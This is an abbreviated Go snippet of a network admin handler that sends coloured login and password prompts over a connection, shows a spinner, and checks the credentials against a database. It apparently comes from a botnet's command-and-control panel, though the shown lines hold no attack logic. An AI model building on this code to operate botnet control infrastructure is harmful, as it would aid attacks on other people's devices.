...
func (this *Admin) Handle() {
    ...
    this.conn.Write([]byte("\033[31;1mLogin\033[97;3m: \033[0m"))
    ...
    // Get password
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[31;1mPassword\033[97;3m: \033[0m"))
    ...
    spinBuf := []byte{'-', '\\', '|', '/'}
    for i := 0; i < 15; i++ {
        this.conn.Write(append([]byte("\r\033[33;1mattempting to authenticate using given credentials.....  \033[31m"), spinBuf[i % len(spinBuf)]))
    ...
    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
        this.conn.Write([]byte("\033[31mAn error has occurred... press (enter) to exit.\033[0m"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }
